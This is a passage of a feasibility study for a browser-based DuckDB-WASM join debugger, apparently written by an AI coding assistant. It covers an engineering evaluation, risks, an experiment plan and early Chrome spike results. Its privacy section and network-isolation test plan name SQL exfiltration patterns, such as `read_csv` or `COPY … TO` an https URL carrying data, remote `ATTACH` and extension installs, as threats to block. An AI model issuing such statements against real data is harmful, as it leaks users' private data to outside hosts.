# Feasibility Study

> **Status: EXPERIMENT PLAN + FIRST SPIKE RESULTS (2026-11-25), CORRECTED AFTER CODEX REVIEW (§10).** §9 is the original record of the first spike; statements in it that the review showed were overstated are marked *[Corrected: §10]*. Read §10 for the current evidence, acceptance matrix and qualification boundary. The browser-feasibility spike ran parts of E0–E8 and E11 **in Google Chrome only**, on the reference MacBook Air. Results, limitations and what was not run are in **[§9](#9-spike-results-2026-11-25)**. Each experiment heading shows its status. Experiments still marked **NOT RUN** have no measurements. Safari and Firefox were **not tested**, and nothing was deployed to the real GitHub Pages.
>
> Author: Claude Code (engineering evaluation of [COMPETITOR_RESEARCH.md](COMPETITOR_RESEARCH.md)), 2026-11-25.
> Approval: each experiment that installs dependencies or writes code is a feasibility spike and needs its own scoped maintainer approval ([CLAUDE.md](../CLAUDE.md), P-010). All acceptance thresholds below are **proposed** and need maintainer approval before they are used as gates.

## 1. Purpose

This document turns the research recommendation (**CONDITIONAL GO** for an evidence-first join debugger) into a prioritised set of experiments that can confirm or reject the provisional technical decisions in [DECISIONS.md](DECISIONS.md) (P-001 to P-013).

It does not change the research conclusions. Where this evaluation disagrees with the research, the disagreement is stated in §2 and left for the maintainer to decide.

**Verification status of this document.** I evaluated the research from its text and from my own engineering knowledge. **I did not open the cited sources, run any code, or re-check the GitHub metrics.** Statements below marked *(to verify)* are my understanding, not verified facts. Each one is assigned to an experiment.

## 2. Engineering evaluation of the research

### 2.1 Is the proposed differentiation technically meaningful?

**Partly, and it depends on one unproven capability.**

- **What is meaningful:** breaking a join's effect down per key (matched pairs, excess copies, unmatched rows, NULL keys) and tracing that to the impact on a measure. The research shows that a net change of zero can hide simultaneous fan-out and row loss. Row-count checks and plan viewers miss that case, and it is the strongest technical hook.
- **What is not a moat on its own:** the arithmetic. `GROUP BY key HAVING COUNT(*) > 1`, an anti-join and a weighted sum are textbook SQL. A competent analyst writes them in minutes, and the research's own counterargument says so. The SQLite check in the research confirms the counting identities, which are true by construction. It says nothing about DuckDB-WASM, about real queries, or about whether users can bring the data.
- **Where the hard engineering is:** mapping **the user's actual query** to the logical join inputs: the relations after earlier filters, aliases, keys and the stage where rows disappear. A two-relation audit with hand-picked keys is a cardinality profiler. Automatically instrumenting a real `SELECT` is what makes QueryVerdict different from "three diagnostic queries". The research treats query parsing as conditional (MVP row "Minimal query workspace, conditional on the spike"). **I think it is the central technical risk and should be tested first (E5), not last.**
- **Challenge, product fit:** the tagline is *"Your query passed. Did your data?"* A first release that never takes the user's query (the relations-first fallback) weakens that message and the instant demo. The research's narrowing from "SQL workspace" to "join debugger" is also a material change from the draft [PROJECT_VISION.md](PROJECT_VISION.md). Both are maintainer decisions (see DECISIONS.md, Open items). I have not adopted either.

### 2.2 Which features are feasible in a browser-only architecture?

These are expectations to test, not results.

| Feature (from vision) | Expected feasibility | Experiment |
|---|---|---|
| CSV and Parquet ingestion of local files | Likely. Depends on whether the Parquet reader is built into the pinned bundle or fetched as an extension *(to verify)* | E1, E2, E6 |
| JSON ingestion | Possible but riskier. Same extension question, plus schema inference on nested data | E2 (availability only) |
| SQL execution off the main thread | Likely (DuckDB-WASM runs in a worker by design) | E1 |
| Join fan-out, row-loss, duplicate and NULL detection for a single equi-join | Likely. Plain SQL probes | E3 |
| Detecting those for a user-written single-join `SELECT` | **Unknown.** Depends on parsing | E5 |
| Query cancellation | Partial. A cooperative cancel may not interrupt a long-running operator. Worker termination is reliable but discards engine state *(to verify)* | E4 |
| Visual debugging / intermediate inspection for arbitrary SQL (CTEs, subqueries, windows) | **Not feasible for the MVP.** Needs a general rewrite and provenance engine | Out of scope |
| Profiling at 500 MB–1 GB | Unknown. Possible for Parquet with column pruning; doubtful for full CSV scans on 8 GB hardware | E6 (characterisation only) |
| Dataset persistence (IndexedDB/OPFS) | Feasible but costly (quotas, eviction, private browsing) and not needed for the MVP | E10 (deferred) |
| Static hosting on GitHub Pages | Likely with the single-thread bundle. Threads need COOP/COEP headers, which Pages cannot set | E1 |

### 2.3 Features that would add excessive complexity

Deferring these is recommended. Most agree with the research's "postpone" list.

1. **Visual SQL debugging for arbitrary SQL** (React Flow canvas plus intermediate relations for every CTE and subquery). A provenance engine is research-sized work. Optimiser reordering means physical plans do not match the stages the author wrote.
2. **Schema-aware autocomplete in Monaco.** Monaco's bundle, worker setup and CDN-default loader *(to verify: `@monaco-editor/react` loads from a CDN by default, which would break P-013)* cost a lot for a debugger whose core value is not editing.
3. **A business-metric validation DSL.** Defining "expectations" well is a product-design problem. Start with a declared grain only (P-012).
4. **Persisting datasets across sessions.** It brings in quota, eviction, migration and privacy-erasure obligations.
5. **Full-dataset profiling at 1 GB.** That workload is the most likely to crash a tab.
6. **Shareable query links.** These are a privacy risk (§4.2) as well as a complexity cost.

### 2.4 Research conclusions I challenge

| Research statement | Challenge | Proposed handling |
|---|---|---|
| "Recovery within two seconds of requesting cancel" (Feasibility experiment design) | This mixes three different things: (a) the UI acknowledges the cancel, (b) the engine is usable again, (c) the user's datasets are re-attached. After worker termination, (b) needs the WASM to be re-instantiated and (c) may need a re-import. Two seconds is reasonable for (a), unknown for (b), and probably unrealistic for (c) at 200 MB or more if data was imported into tables *(to verify)* | E4 measures all three separately, with separate thresholds |
| Peak memory to be recorded "by available instrument" | `performance.measureUserAgentSpecificMemory()` needs cross-origin isolation *(to verify)*, which the Pages baseline will not have. Browser memory APIs will be partial or missing | Use OS-level process memory plus DuckDB's own memory reporting, and label which instrument produced each number (E6) |
| Network isolation via "the smallest documented runtime policy" plus CSP | GitHub Pages cannot send CSP headers. A `<meta>` CSP does not obviously govern a worker loaded from its own URL *(to verify)*. DuckDB runs in that worker | E2 tests whether the engine's own configuration lock is the real control and whether a meta CSP or blob-URL worker adds anything |
| Demand gate (8 interviews, 5 observed tasks) before production approval | Reasonable as screening, but it is user research, not engineering. A solo maintainer may struggle to recruit analysts with representative local exports. It should not block the technical spikes, which are needed whatever the product scope | Run E1–E5 in parallel with user discovery |
| Queries are "exact" with DECIMAL measures | DuckDB DECIMAL has bounded precision, and DOUBLE measures introduce rounding, so "net-zero" needs a tolerance policy for floating-point types | E3 includes DOUBLE and DECIMAL cases and requires a documented tolerance |
| SQL Viewer is the closest competitor | Plausible, but its features come from its README only. Nobody ran it | Out of scope here. A hands-on comparison belongs in user discovery |

I did not re-check the competitor feature claims or the repository metrics, so I neither confirm nor dispute them.

## 3. Smallest technically meaningful proof of concept

A single static page with **no UI framework**: plain TypeScript, and Vite only if the spike approval allows it. It is served from a **repository-style subpath** with **no COOP/COEP headers**. It must:

1. Load a **pinned** DuckDB-WASM single-thread bundle, with all assets served from the same origin. No CDN.
2. Apply a locked engine configuration that turns off external access and extension auto-install/auto-load *(setting names and their effect in WASM to verify)*.
3. Register two **local** generated CSV files through the browser file picker, without copying the whole file into the WASM heap if the API allows it *(to verify)*.
4. Run the join-audit probes from the research (key multiplicity, excess copies, unmatched rows on each side, NULL-key rows, measure delta) for one INNER and one LEFT single-key equi-join. Compare the results with known answers.
5. Stream at most 100 witness rows to a plain HTML table.
6. Cancel a deliberately expensive skewed join, fall back to terminating the worker, and recover.
7. Record every network request from the page and the worker, showing only allowed same-origin assets and no canary values.
8. *(Stretch, E5)* Parse one user-written single-join `SELECT` into tables, keys and join type through the engine, and refuse anything outside that subset as **unsupported**.

Steps 1–7 decide whether the engine and hosting model are viable. Step 8 decides whether the differentiation is achievable. The proof of concept is throwaway code on an `exp/` branch and is never merged as production code.

## 4. Most important failure cases and risks

### 4.1 Browser memory

- **The WASM memory ceiling** (the research cites 4 GB for wasm32) is shared by file buffers, DuckDB's working memory for hash joins and aggregates, and Arrow results. On an 8 GB machine the browser and OS may impose a lower practical ceiling. Safari's behaviour is the least predictable *(to verify)*.
- **Failure mode matters more than the limit.** A DuckDB out-of-memory error can be recovered. A renderer crash ("Aw, Snap" / "This webpage was reloaded") loses all state. E6 must record which one happens at each size.
- **Copies:** registering a whole file as a buffer copies it into the WASM heap. Converting Arrow results into JS objects copies again. `LIMIT` caps what is displayed, not the upstream join work.
- **Imported tables vs file-backed views:** importing gives faster repeated probes but is lost on worker termination and uses heap memory. File-backed views survive a restart (they only need re-registering) but re-scan the file each time. E4 and E6 measure this trade-off.

### 4.2 Privacy

- **Exfiltration through SQL**, not just through app code: `read_csv('https://…?q=<data>')`, `COPY … TO 'https://…'`, `ATTACH`, `INSTALL httpfs` and extension auto-loading. User-typed SQL is low risk (it is the user's own data). **SQL from a shared link or a crafted demo is not.** Locking the configuration must block these from SQL, and SQL must not be able to unlock them.
- **Third-party fetches by dependencies:** extension repositories, editor CDNs, web fonts, source maps.
- **Error reports and exports:** stack traces or "copy diagnostic" output could include data values. Exports must be deliberate and local-only.
- **The hosting origin:** `<user>.github.io` is shared by all of that user's Pages project sites. They share localStorage, IndexedDB and OPFS. Persisting data there would expose it to sibling project sites *(the research raises this; to verify)*. This is a further reason not to persist datasets in the MVP.

### 4.3 Static hosting

- No custom headers, so no COOP/COEP (no threads) and no header CSP. Every privacy control has to be enforced at the page, worker and engine level.
- Correct MIME type for `.wasm` and worker scripts, asset paths under the subpath, and cache behaviour after redeploys (stale worker or WASM mismatch) *(to verify)*.
- The research cites a 100 GB/month soft bandwidth limit. Each cold visit downloads the engine (multiple MB, size unmeasured), so compressed transfer size is a launch-day risk. E1 measures it.

### 4.4 Correctness and trust

- A false "confirmed issue", or a clean result read as "correct", is the product-ending failure (research: "False certainty"). Probes must use the same NULL and type comparison semantics as the user's join. Mismatched key types (e.g. `INTEGER` against `VARCHAR`), implicit casts and collations must come back as **unsupported** or ask the user. They must never be guessed.
- Sampled or interrupted analysis must never report a clean result.

### 4.5 Upstream churn

- DuckDB's serialised-SQL JSON format is an internal representation with no stated stability guarantee *(to verify)*. Pinning the version is mandatory, and an upgrade must pass the E5 corpus again.

## 5. Dependencies requiring compatibility and licence validation

**None of these has been checked yet.** Licences named below are the research's claims or my understanding and must be confirmed from each pinned release artifact (E11).

| Dependency | Why | Compatibility to check | Licence check |
|---|---|---|---|
| `@duckdb/duckdb-wasm` (pinned) | Engine (P-003) | Single-thread bundle without isolation; built-in vs fetched extensions (parquet, json); worker asset paths; cancellation API | MIT claimed. Also review third-party notices for code bundled into the WASM binary and for any shipped extension binaries |
| `apache-arrow` (version matched to the engine) | Result transport | Major-version match with DuckDB-WASM (the research cites insert failures on mismatch) | Apache-2.0 (to confirm). Keep its NOTICE |
| Vite | Build (P-002) | WASM/worker asset handling, `base` subpath build | MIT (to confirm) |
| React + TypeScript | UI (P-001) | Not needed for the PoC. Decide after E1–E5 | MIT / Apache-2.0 (to confirm) |
| Monaco vs CodeMirror 6 | Editor (P-005) | Self-hosted loading, worker configuration, bundle size, keyboard accessibility | MIT both (to confirm) |
| TanStack Table/Virtual | Grid (P-007) | Only if a plain bounded table fails E8 | MIT (to confirm) |
| React Flow (xyflow) | Visual debugging (P-006) | Deferred (§2.3) | MIT core. Check that no Pro-only feature is needed |
| SQLite WASM | Fallback engine | Only if E1/E2 fail. Different dialect, no Parquet | Public domain (to confirm) |
| Test harness (e.g. Playwright) | Browser automation, request capture | Whether request capture covers worker requests in all three engines *(to verify)* | Apache-2.0 (to confirm). Dev-only |
| Competitor code (PondPilot AGPL-3.0, SQL Viewer with unclear licence) | — | **Do not reuse.** Reimplement concepts only | — |

**Project licence:** still open. MIT or Apache-2.0 would both be compatible with the dependencies above, if their claimed licences are confirmed.

## 6. Prioritised experiment plan

### 6.0 Rules that apply to every experiment

- **Status: every experiment is NOT RUN.** No experiment starts without the maintainer's scoped spike approval naming the experiment ID and the allowed dependencies.
- **Data:** synthetic data from a seeded generator script only. No real, private or third-party datasets. Generated files live in git-ignored paths (`benchmarks/generated/`, `scratch/`) and are never committed. Record the seed, generator version, row count, bytes on disk, column types and key distribution.
- **Environment record for every result:** hardware (reference: Apple M2 MacBook Air, 8 GB, D-009), macOS version, browser name and exact version, DuckDB-WASM version and bundle, commit hash, cold or warm run, number of repetitions, and which instrument produced each metric. A missing metric is recorded as **missing**, never estimated.
- **Machine safety:** run large-size tests in a dedicated browser profile with other heavy apps closed and no unsaved work open. Escalate sizes one step at a time (50 → 200 → 500 → 1000 MB), and only after the previous size has completed or failed cleanly. Use a per-run watchdog timeout (proposed: 10 minutes). After the first renderer crash at a given size, stop that size and record the crash instead of retrying in a loop.
- **Privacy safety:** the spike page makes no requests other than to its own static assets. Network-isolation tests that try to reach an external URL point at a **non-routable or local-only address** (e.g. a local listener on `127.0.0.1` that just logs hits), never at a real third-party server.
- **Deployment:** local static server that copies the Pages subpath layout. Any real GitHub Pages deployment (a throwaway test repository or branch) needs separate explicit approval and never touches the production site.
- **Reporting:** results are added to this document under each experiment as a dated **Result** block with raw numbers, failures and limitations. Summaries quote medians and worst cases with sample counts. A failed experiment is reported as failed.

### 6.1 Priority overview

| Pri | ID | Experiment | Decides | Status |
|---|---|---|---|---|
| P0 | E0 | Fixture generator and harness | Prerequisite for all | RUN |
| P0 | E1 | Static deployment and engine boot without isolation | P-002, P-003 (hosting) | PARTLY RUN (Chrome, local) |
| P0 | E2 | Network isolation and configuration lockdown | P-003, P-013, D-004 | RUN (Chrome) |
| P0 | E3 | Join-audit correctness on DuckDB-WASM | Core algorithm, D-013/P-012 | RUN for the supported subset (§11) |
| P0 | E4 | Cancellation and recovery | P-003, P-004 | RUN (Chrome) |
| P1 | E5 | Query parsing for a single-join `SELECT` | Differentiation, MVP scope | RUN (§11) |
| P1 | E6 | Ingestion paths and memory characterisation (50 MB–1 GB) | D-009 workloads, supported limits | RUN (Chrome) |
| P1 | E7 | Browser matrix (Chromium, Firefox, Safari) | Supported browsers | PARTLY RUN (Chrome only) |
| P1 | E11 | Licence and notice audit of the pinned artifacts | Licence choice, redistribution | PARTLY RUN |
| P2 | E8 | Result streaming and main-thread responsiveness | P-004, P-007 | PARTLY RUN; results-grid rendering measured in M06 (R1, §16) |
| P2 | E9 | Editor comparison (Monaco vs CodeMirror 6) | P-005, P-052 | RUN in M05 (§15) |
| P3 | E10 | OPFS spill and persistence | P-008 | NOT RUN (deferred) |

E0–E4 together are the proof of concept in §3. If E1 or E2 fails, stop and escalate before running anything else.

---

### E0. Fixture generator and measurement harness: RUN (§9.2)

- **Goal:** reproducible inputs and a consistent way to record results.
- **Inputs:** a seeded generator producing paired `left` and `right` relations in CSV and Parquet. Parameters: rows, key cardinality, key skew (uniform; Zipf-like; one hot key), NULL-key rate, duplicate rate, orphan rate on each side, composite-key arity (1–2), measure type (INTEGER, DECIMAL(18,2), DOUBLE), and row width (narrow ~5 columns; wide ~50 columns).
- **Workload:** generate the small known-answer corpus (E3) and the size ladder (E6). Size is reported **per relation and in total**, on disk.
- **Measurements:** generation time, file sizes, checksums.
- **Safeguards:** output only to git-ignored paths. Generation runs outside the browser (a script) so it cannot affect browser measurements.
- **Acceptance (proposed):** the same seed produces identical checksums on two runs. Every fixture has a manifest with its parameters and expected answers (for corpus fixtures).

### E1. Static deployment and engine boot without isolation: PARTLY RUN (Chrome, local Pages-style server; §9.3)

- **Question:** does a pinned single-thread DuckDB-WASM build load and run SQL from a static subpath with no COOP/COEP headers and no CDN?
- **Inputs:** the production-style static build served at `/<repo>/` by a local static server with default headers. `crossOriginIsolated` must be `false`.
- **Workload:** cold load (empty cache) and warm load, 10 each per browser. `SELECT 42`, then a 10k-row in-memory join.
- **Measurements:** which bundle is selected; compressed and uncompressed bytes transferred, per asset and in total; time to engine ready; time to first query result; MIME type served for `.wasm` and the worker; console errors.
- **Safeguards:** no external network (verified by E2 tooling). Throwaway code only.
- **Acceptance (proposed):** the engine boots and runs both queries in all three browser families with `crossOriginIsolated === false`; zero requests leave the origin; asset sizes are recorded (no size threshold until the maintainer sets a budget). **Failure:** escalate. Fallbacks: a different bundle, or SQLite WASM (CSV-only).

### E2. Network isolation and configuration lockdown: RUN in Chrome (§9.4)

- **Question:** can the engine be configured so that no SQL can reach the network or load extensions, and is any extension needed for CSV, Parquet or JSON fetched at runtime?
- **Inputs:** the E1 page with a candidate locked configuration *(candidates to verify in the pinned version: disable external access, disable extension auto-install and auto-load, lock the configuration)*. Canary values (unique random strings) planted in local data and in SQL text. A local-only logging listener on `127.0.0.1` used as the "external" target.
- **Workload:** run, against the listener URL, `read_csv`/`read_parquet` on an http(s) URL, `COPY … TO` an http(s) URL, `ATTACH` a remote database, `INSTALL`/`LOAD` an extension, any statement that tries to undo the lockdown, and functions that would trigger auto-loading (Parquet, JSON, and `json_serialize_sql` for E5). Repeat during startup, a normal audit, export, a forced error and cancellation. Separately test whether a `<meta>` CSP `connect-src 'self'` and a blob-URL worker restrict requests made by the worker.
- **Measurements:** every request from the page **and the worker** (method, URL, initiator), captured by browser automation and cross-checked with the listener's log; whether each statement errors or succeeds; which features are built in and which need an extension.
- **Safeguards:** the listener never forwards anything. No real external host is contacted.
- **Acceptance (proposed):** **zero** requests to anything but allowed same-origin assets; **zero** canary values seen by the listener; every escalation statement fails with an error the app can show; local file registration still works under the lock. CSV and Parquet must work without a runtime extension fetch, or with a same-origin, self-hosted extension that is checked against a recorded integrity hash. **Failure:** this blocks P-003 under P-013. Escalate to the maintainer.

### E3. Join-audit correctness on DuckDB-WASM: RUN for the supported subset (§11; Chrome only)

- **Question:** do the research's probe queries give exact answers in the pinned DuckDB-WASM, matching a directly materialised join?
- **Inputs:** the E0 known-answer corpus, covering every case in the research's verification strategy: one-to-one; intended many-to-many; unwanted one-to-many; orphans on both sides; repeated NULL keys; composite keys with a partial NULL; empty relations; DECIMAL, DOUBLE and negative measures; fan-out with a net-zero sum; fan-out plus loss with unchanged row counts; LEFT JOIN with a NULL-rejecting WHERE; a nullable right value inside a real match; mismatched key types. Plus at least 500 seeded random fixtures (small: ≤ 1,000 rows each).
- **Workload:** for each fixture, the INNER and LEFT probes versus `COUNT(*)` and `SUM` over the materialised join. Run a differential check of the random fixtures against SQLite (Python standard library, no install) for single-key INNER and LEFT cases.
- **Measurements:** per-fixture match or mismatch for each metric; the classification produced (per AGENTS.md §8 and P-012), with and without a declared grain.
- **Safeguards:** fixtures are synthetic and tiny. The test runs in the browser and also in a headless runner if the spike approval allows one.
- **Acceptance (proposed):** **100 % agreement** on integer counts and integer/DECIMAL sums. DOUBLE sums agree within a documented tolerance. Mismatched key types are reported as unsupported, not analysed. With no declared grain, no fixture is labelled "confirmed issue". With a declared grain, every violating fixture is labelled "confirmed issue" and no compliant fixture is. **Any mismatch fails E3.**

### E4. Cancellation and recovery: RUN in Chrome (§9.5)

- **Question:** can a running audit be stopped quickly, and how long does it take to get back to a usable state?
- **Inputs:** a stress case designed to run for 30 seconds or more: one hot key on both sides (pathological fan-out), plus a 200 MB CSV import. Data is attached two ways: (a) imported into tables, (b) file-backed views.
- **Workload:** 20 cycles each of: start, cooperative cancel at 1 s / 5 s / 15 s; if the query has not stopped within a timeout (proposed 2 s), terminate the worker, re-create it and re-attach the data. Cancel during import, during the join and during result streaming.
- **Measurements, recorded separately:** (a) time from clicking Cancel to the UI acknowledging it; (b) whether the cooperative cancel worked and how long it took; (c) time until the engine is ready again; (d) time until the datasets are queryable again, for each attach mode; main-thread long tasks during the cycle; stale messages from a terminated worker reaching the UI; memory before and after 20 cycles (leaks).
- **Safeguards:** a watchdog closes the tab if a cycle exceeds 10 minutes. Stop after the first renderer crash.
- **Acceptance (proposed):** (a) ≤ 200 ms in every cycle. A cooperative cancel or the fallback ends the work within 2 s in every cycle. (c) is measured and reported, with no threshold until baseline numbers exist. The UI never shows stale results. Memory after 20 cycles is no more than 10 % above memory after cycle 1. (d) is reported for each attach mode to decide the attach strategy.

### E5. Query parsing for a single-join `SELECT`: RUN, extended to left-deep chains and CTEs (§11; Chrome only)

- **Question:** can the pinned engine's own parser (e.g. SQL-to-JSON serialisation, *availability in the WASM bundle to verify*) reliably extract the relations, aliases, join type, equi-join keys and the position of WHERE predicates from a simple query? Can it refuse everything else?
- **Inputs:** a corpus of at least 60 queries: at least 20 inside the supported subset (single INNER/LEFT equi-join, optional WHERE, GROUP BY with SUM/COUNT; aliases, quoted identifiers, composite keys) and at least 40 outside it (CTEs, subqueries, multiple joins, OR/non-equality conditions, USING/NATURAL, RIGHT/FULL, window functions, DISTINCT ON, unions, invalid SQL).
- **Workload:** parse each query, then classify it as supported (with extracted structure) or unsupported (with a reason).
- **Measurements:** classification and extracted structure compared with the hand-written expected outcome, plus parse time.
- **Safeguards:** no regex-based SQL splitting. Parsing runs under the E2 lockdown, which also shows whether the needed function requires a network extension.
- **Acceptance (proposed):** **zero queries wrongly accepted** (an unsupported query treated as supported); extraction is correct for at least 95 % of supported queries, with the rest refused rather than mis-analysed; the parser works under lockdown. **Failure:** the MVP falls back to the research's relations-first audit. That is a product decision for the maintainer (§2.1).

### E6. Ingestion paths and memory characterisation: RUN in Chrome (§9.6, §9.7)

- **Question:** what workloads work on the reference machine, and how do they fail?
- **Inputs:** the E0 size ladder of 50, 200, 500 and 1,000 MB **per relation** (also record totals), in CSV and Parquet, narrow and wide, uniform and skewed keys.
- **Workload:** for each of three attach methods (file handle without a copy, if available; full buffer copy; import into a table): attach, then run a key profile (`GROUP BY key`), then the full E3 audit probes, then return 100 witness rows. Cold and warm runs, at least 5 repetitions per cell, moving up the size ladder.
- **Measurements:** time to first evidence; total audit time; browser renderer process memory at the OS level (peak, sampled); DuckDB's reported memory use; whether the outcome was success, a recoverable engine error or a renderer crash; and how the UI behaved.
- **Safeguards:** the machine-safety rules in §6.0, with the DuckDB memory limit set explicitly to below the observed browser ceiling so failures surface as recoverable errors where possible.
- **Acceptance (proposed):** 50 MB per relation, CSV and Parquet, uniform keys: audit succeeds in Chromium, Firefox and Safari with no renderer crash. Above 50 MB: **characterisation only.** Every result is published as measured, with no pass/fail claim, until the maintainer sets support targets from the data. The output is the first draft of a support matrix.

### E7. Browser matrix: PARTLY RUN (Chrome only; Safari and Firefox NOT RUN; §9.9)

- **Inputs:** current stable desktop Chrome (or another Chromium browser), Firefox and Safari on the reference machine. Record the exact versions.
- **Workload:** E1, E2, E3 (corpus only), E4 (5 cycles) and E6 at 50 MB. File input with the standard `<input type=file>`, plus the enhanced file picker where the browser supports it.
- **Measurements:** pass or fail for each step in each browser, plus any browser-specific errors.
- **Acceptance (proposed):** all steps pass in all three. A browser that fails is listed as unsupported with the reason, never hidden.

### E8. Result streaming and main-thread responsiveness: PARTLY RUN (bounded results and responsiveness; 10,000-row rendering NOT RUN; §9.6)

- **Inputs:** a 1M-row result from the E6 50 MB fixture.
- **Workload:** stream record batches and render the first 100 and first 10,000 rows in a plain HTML table, then scroll.
- **Measurements:** time to first rows; main-thread long tasks (> 50 ms) per second; memory growth.
- **Acceptance (proposed):** no long task over 200 ms while streaming the bounded result. A virtualised grid (P-007) is adopted only if the plain bounded table fails this.

### E9. Editor comparison: RUN in M05, results in §15

- **Inputs:** a minimal page with Monaco and the same page with CodeMirror 6, both self-hosted.
- **Measurements:** compressed bundle cost; any requests leaving the origin (CDN default *to verify*); worker setup under the build tool; keyboard-only operation and screen-reader labelling; SQL highlighting and basic schema-name completion.
- **Acceptance (proposed):** zero requests leaving the origin; full keyboard operation. Between candidates that pass, choose the smaller bundle unless a required capability is missing.

### E10. OPFS spill and persistence: NOT RUN (deferred)

Deferred until after the MVP decision. If run: quota and eviction behaviour, explicit deletion, private-browsing failure, and exposure on a shared `github.io` origin (§4.2).

### E11. Licence and notice audit: PARTLY RUN (npm packages only; §9.8)

- **Inputs:** the exact pinned release artifacts from E1 (npm tarballs, `.wasm` files, any extension binaries) and their licence and notice files.
- **Workload:** list every redistributed file and its licence, including third-party code bundled into the WASM binary.
- **Acceptance (proposed):** every redistributed artifact has a known licence compatible with the candidate project licence, and the required notices are collected. Any unknown licence blocks deployment of that artifact.

## 7. Decision outcomes this plan feeds

| If… | Then (proposal for the maintainer) |
|---|---|
| E1–E4 pass, E5 passes | Query-first MVP on DuckDB-WASM is technically viable. Proceed to PRD and architecture |
| E1–E4 pass, E5 fails | Relations-first audit (research fallback). Product decision needed on whether the tagline and vision still fit |
| E2 fails (cannot enforce network isolation) | P-003 is blocked under P-013. Evaluate SQLite WASM or a narrower engine configuration before anything else |
| E4 shows no reliable recovery | Not releasable (vision requires cancellation and recovery). Investigate before building UI |
| E6 shows crashes at 50 MB | Re-scope supported workloads before any public claim |

## 8. Open questions for the maintainer

1. Approve or reject running the technical spikes (E0–E5) **in parallel with** the research's user-discovery gate, rather than after it.
2. Query-first or relations-first MVP (§2.1). Does narrowing from "SQL workspace" to "join debugger" change the approved vision?
3. Are the proposed acceptance thresholds in §6 acceptable as gates?
4. Which experiments may install which dev dependencies (e.g. DuckDB-WASM, Vite, a browser-automation tool)?
5. Is a throwaway real GitHub Pages deployment allowed for E1/E2, and on which repository?
6. Are shareable query links ever in scope, given the exfiltration risk in §4.2?

## 9. Spike results (2026-11-25)

Prototype: [`spikes/browser-feasibility/`](../spikes/browser-feasibility/README.md) on branch `spike/browser-feasibility`. Throwaway code (P-010). Every number below was measured in this session. Raw per-run JSON is git-ignored under `spikes/browser-feasibility/results/raw/`; the curated summary is [`results/summary.json`](../spikes/browser-feasibility/results/summary.json). All commands are in the spike README.

### 9.1 Environment and method

| Item | Value |
|---|---|
| Hardware | MacBook Air (Mac14,2), Apple M2, 8 GB RAM. The D-009 reference machine |
| OS | macOS 26.5.2 (25F84) |
| Browser | Google Chrome 158.0.8127.37, driven by Playwright 1.65.1 (channel `chrome`, **headless**, fresh profile per run) |
| Engine | `@duckdb/duckdb-wasm` **1.33.1-dev57.0** (npm `latest` tag), DuckDB **v1.5.4**, `eh` bundle selected, single-threaded, `crossOriginIsolated = false` |
| Engine settings | `threads = 1`, `memory_limit = 2GB` unless stated, lockdown on (§9.4) |
| Build | React 19.3.1, Vite 8.3.8, TypeScript 7.0.2 (strict), apache-arrow 17.0.0 (the version DuckDB-WASM requires) |
| Serving | `vite preview` at `/queryverdict/`: no COOP/COEP/CSP headers, like GitHub Pages. **Not** the real GitHub Pages |
| Machine state | Before each run the macOS memory-free level was 36–59 % and 3.8–5.2 GB of swap was in use (other applications open). Recorded per run |
| Data | Seeded synthetic `orders` and `customers` (seed 20261125). Fan-out: 1 % of customer keys appear 3 times. Row loss: 2 % of order keys have no customer. Expected answers computed by the generator |
| Repetitions | 3 per workload; cancel workloads 5 (20 for the 50 MB CSV leak check). Timings are medians |

**Caveats for every number:** single machine, single browser, headless; the data files had just been written, so they were probably in the OS file cache (warm I/O); other apps were running. Treat timings as indicative, not as published limits.

**Memory labels:** *OS RSS* = actual `ps` RSS of the Chrome process tree, sampled every 250 ms (over-counts shared pages; excludes compressed/swapped pages). *Engine* = DuckDB `duckdb_memory()` (buffer manager only). *Browser API* = Chromium `performance.memory` (main-thread JS heap only; excludes the engine worker). `performance.measureUserAgentSpecificMemory()` was **unavailable** because the page is not cross-origin isolated, confirming that assumption. No estimate is shown as a measurement.

### 9.2 E0: generator and harness

- `scripts/generate_datasets.py`: identical seed gives byte-identical files (unit-tested); expected answers are re-checked against a direct recount (unit-tested). Generation took 6 s (50 MB) to 80 s (1 GB) including Parquet conversion.
- Sizes are defined by the orders **CSV** file. The same rows are about 0.43–0.46× as Parquet and 2.2× as NDJSON.
- NDJSON was generated and benchmarked only at 50 MB and 200 MB (as planned).

### 9.3 E1: static hosting and engine boot

- The production build loads and runs SQL from `/queryverdict/` with **no COOP/COEP headers** and `crossOriginIsolated = false`, using the single-threaded `eh` bundle. The threads (`coi`) bundle is excluded from the build.
- Requests on first load (Chrome): page, app JS/CSS, engine worker, `duckdb-eh.wasm`, and the two self-hosted extensions. All same-origin.
- Engine boot on localhost (5 runs): **cold median 549 ms, warm median 510 ms** (instantiate, open, lockdown, extension load). Network download time is **not** included; on a real connection it will dominate.

| Asset | Bytes (uncompressed) | gzip -9 (local estimate) | brotli 11 (local estimate) |
|---|---:|---:|---:|
| `duckdb-eh.wasm` | 35,913,747 | 8,054,501 | 5,452,859 |
| `parquet` extension (eh) | 3,218,307 | 736,749 | 522,051 |
| `json` extension (eh) | 821,413 | 192,377 | 127,983 |
| engine worker JS (eh) | 773,223 | 187,988 | 155,857 |
| app JS (React + engine glue) | 438,519 | 120,229 | 103,157 |
| **First visit, eh path** | **≈ 41.2 MB** | **≈ 9.3 MB** | **≈ 6.4 MB** |

- The `mvp` fallback bundle (41.3 MB) is also in the build but was not downloaded by Chrome.
- **Not verified:** whether GitHub Pages compresses `.wasm` (it determines whether a visit costs about 6–9 MB or 41 MB). The research's 100 GB/month soft limit would allow very roughly 2,400 (uncompressed) to 15,000 (brotli) cold visits. *That is arithmetic on the table above, not a measurement or forecast.*
- **Not verified:** a real GitHub Pages deployment, MIME types served by Pages, cache behaviour after redeploys.

### 9.4 E2: network isolation

**Findings that change earlier assumptions:**

1. **Parquet and JSON readers are not built into DuckDB-WASM v1.5.4.** Only `core_functions` is statically linked. By default the engine **downloads extensions from `https://extensions.duckdb.org` at runtime**, which the negative control observed. The default configuration therefore makes third-party requests as soon as a JSON or Parquet file is read.
2. **The page's `<meta>` CSP (`connect-src 'self'`) does not restrict the engine's worker.** With lockdown off, the worker reached a local "external" listener and `extensions.duckdb.org` despite the CSP (Chrome 158). On GitHub Pages, which cannot send CSP headers, **the engine lockdown is the only effective control.** The meta CSP is kept, but only as defence in depth for the page itself.

**Lockdown used** (`src/engine/lockdown.ts`, applied before any user file is registered):
- the extension repository points at the app's own origin;
- auto-install and auto-load are off, and community extensions are off;
- `parquet` and `json` are loaded explicitly from the same-origin files;
- `allowed_directories = ['/qv-local/']`, where user files are registered;
- `enable_external_access = false`;
- `lock_configuration = true`.

